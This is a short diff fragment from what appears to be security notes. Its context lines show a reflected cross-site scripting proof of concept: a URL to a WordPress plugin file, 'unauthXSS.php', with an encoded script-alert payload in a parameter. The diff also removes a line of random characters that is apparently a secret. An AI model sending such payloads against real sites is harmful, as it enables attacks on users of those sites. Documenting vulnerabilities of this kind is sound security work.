@@ -28,5 +28,3 @@ https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS
 
 https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E
 
-
-u#)S@jAdfQJpG*7LI0RSxqQZ
